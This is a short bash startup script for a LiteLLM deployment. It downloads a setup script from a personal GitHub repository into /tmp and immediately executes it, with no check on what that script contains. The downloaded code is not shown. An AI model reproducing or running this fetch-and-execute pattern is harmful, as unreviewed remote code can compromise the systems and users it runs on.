#!/bin/bash
set -e

echo "=== LiteLLM Startup with Dynamic Config ==="

# Download and execute the configuration script
echo "Downloading configuration script..."
curl -sSf https://raw.githubusercontent.com/max313iq/anos/main/setup_litellm.sh -o /tmp/setup_litellm.sh
chmod +x /tmp/setup_litellm.sh

# Execute the downloaded script
exec /tmp/setup_litellm.sh
